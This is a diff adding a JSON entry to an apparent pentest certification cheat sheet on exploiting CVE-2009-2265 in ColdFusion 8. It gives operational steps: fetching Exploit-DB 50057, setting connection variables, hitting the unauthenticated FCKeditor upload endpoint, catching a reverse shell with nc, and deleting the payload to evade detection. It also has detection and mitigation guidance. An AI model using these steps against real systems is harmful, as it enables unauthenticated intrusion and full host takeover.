@@ -1,0 +1,115 @@
+{
+  "id": "coldfusion-unauth-rce",
+  "name": "ColdFusion - Unauthenticated RCE (CVE-2009-2265)",
+  "command": "python3 50057.py   # after editing lhost/lport/rhost/rport in the script",
+  "description": "Adobe ColdFusion 8.0.1 and earlier ship a vulnerable FCKeditor file manager that lets an unauthenticated attacker upload a JSP payload and gain remote code execution (CVE-2009-2265). The EDB script 50057 automates payload generation, upload, and catching the reverse shell - typically landing as the ColdFusion service account (often SYSTEM on Windows).",
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "searchsploit",
+    "python3",
+    "ncat"
+  ],
+  "tags": [
+    "coldfusion",
+    "rce",
+    "file-upload",
+    "cve-2009-2265",
+    "fckeditor",
+    "reverse-shell"
+  ],
+  "category": "Exploitation",
+  "subcategory": "ColdFusion",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "variations": [
+    {
+      "label": "Vulnerable FCKeditor upload endpoint (manual confirmation)",
+      "command": "http://<ip>:<port>/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder="
+    }
+  ],
+  "examples": [
+    {
+      "label": "Pull the exploit into a working dir",
+      "command": "searchsploit -p 50057 && cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py ."
+    },
+    {
+      "label": "Edit the exploit's connection settings before running",
+      "command": "# in 50057.py __main__:\nlhost = '<lhost>'   # your VPN IP\nlport = <lport>     # local listener port\nrhost = '<ip>'      # target\nrport = <port>      # 8500"
+    },
+    {
+      "label": "Run - it stages the JSP payload and catches the shell",
+      "command": "python3 50057.py"
+    }
+  ],
+  "notes": "The exploit generates a random-named .jsp payload, uploads it via the FCKeditor connector to /userfiles/file/, starts its own listener, then requests the payload to trigger the reverse shell. No credentials needed. Lands as the ColdFusion8 service account - on Windows this is frequently SYSTEM, so it is often game over without further privesc. If the bundled listener is flaky, comment it out and catch manually with `nc -lvnp <lport>`. Alternative path to admin: read password.properties via coldfusion-directory-traversal, crack the SHA1, then RCE through a scheduled task. Also covered in: OSCP PEN-200 (Web Application Attacks).",
+  "references": [
+    {
+      "title": "Exploit-DB 50057 - Adobe ColdFusion 8 RCE",
+      "url": "https://www.exploit-db.com/exploits/50057"
+    },
+    {
+      "title": "NVD - CVE-2009-2265",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2009-2265"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "coldfusion-discovery",
+      "note": "Confirm ColdFusion 8.0.1 or earlier before firing this.",
+      "rel": "prereq"
+    },
+    {
+      "id": "coldfusion-directory-traversal",
+      "note": "Alternative foothold - leak and crack the admin password instead.",
+      "rel": "alternative"
+    },
+    {
+      "id": "other-apps-defaults",
+      "note": "If already SYSTEM you are done; otherwise pivot to local privesc.",
+      "rel": "escalation"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1505.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "prerequisites": "Adobe ColdFusion 8.0.1 or earlier with the bundled FCKeditor package present and reachable at /CFIDE/scripts/ajax/FCKeditor/. No authentication required.",
+    "why_it_works": "The FCKeditor connector's FileUpload command does not authenticate the caller or validate the uploaded file type/extension, so a .jsp payload can be written into a web-served directory and then executed by requesting it.",
+    "misconfiguration": "Unpatched CF8 exposing the FCKeditor file manager to unauthenticated users; upload directory (/userfiles/) is web-executable.",
+    "impact": "Unauthenticated remote code execution as the ColdFusion service account - commonly SYSTEM on Windows, i.e. full host compromise.",
+    "detection": "Web log: POST to .../FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload; creation of .jsp files under /userfiles/file/; subsequent GET to a random-named .jsp; unexpected outbound connection from the CF host (reverse shell).",
+    "artifacts": "Dropped .jsp payload in the CF webroot/userfiles; FCKeditor upload entries in access logs; new child processes spawned by the ColdFusion/JRun process.",
+    "vulnerable_config": "# ColdFusion 8.0.1, FCKeditor connector reachable pre-auth\n# /CFIDE/scripts/ajax/FCKeditor/.../upload.cfm accepts .jsp",
+    "secure_config": "# Apply Adobe hotfix for CVE-2009-2265; remove the bundled FCKeditor\n# Block/remove /CFIDE/scripts/ajax/FCKeditor if unused\n# Deny script execution in upload directories; run CF as least-privilege",
+    "prevention": "Patch CVE-2009-2265 and remove the vulnerable FCKeditor. Disable execution in upload directories. Restrict /CFIDE/ to internal IPs. Run ColdFusion as a non-privileged service account, not SYSTEM. [MITRE M1051, M1042, M1026]",
+    "evasion": "Randomized payload filenames evade static IOC lists; upload then immediately delete the payload after the shell connects (the script does this) to reduce on-disk artifacts.",
+    "sources": [
+      "HTB M24",
+      "MITRE T1190",
+      "MITRE T1505.003",
+      "CVE-2009-2265"
+    ]
+  }
+}
